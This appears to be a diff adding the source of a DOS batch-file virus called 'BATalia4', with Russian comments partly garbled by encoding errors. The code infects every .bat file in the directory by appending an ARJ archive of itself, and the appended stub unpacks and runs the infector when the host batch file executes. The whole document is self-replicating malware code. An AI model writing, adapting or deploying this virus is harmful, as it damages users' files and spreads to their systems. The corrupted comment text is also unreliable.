@@ -1,0 +1,30 @@
+if "%1"=="4" goto s   ; если на??звал??паpаметp? 4 то заpажае?
+for %%b in (*.bat) do call %0 4 %%b ;тестиpуе?вс?батник?? ка?лога
+goto b                    ; пp?еpки зако?илис?
+:s
+if %2==I.BAT goto b       найд???бати??мы ? ?ходи?
+arj l %2 >nul             ?ко??батник?есть аpхи??
+if errorlevel 1 goto i    ??заpажае?
+goto b                    есть ?ходи?
+:i
+ren %2 p >l               пpевpащае?оpигинал ?p
+arj a j i.bat SG >nul     аpхивиpуе?i.bat ?SG
+copy /b p+SG+j.arj %2>l   ?за?сыва? ?ко??батник?
+del j.arj                 деля? пp?ежут???
+del ?                     ?йл?
+:b                        ко???йл?
+
+
+?йл SG
+
+заpаж???bat??ис?лняетс?
+
+ту?ку? пp??? ?enter'?
+
+@echo off      на экpан ?чего ? ?казывать
+rem BATalia4       им?виpус?
+arj x %0 >nul  вскpывае?себя на пpедме?i.bat ?SG
+call i         ?заpажае?всех вокpуг
+del sg         ?удаляе?
+del i.bat      вс?лишнее
+
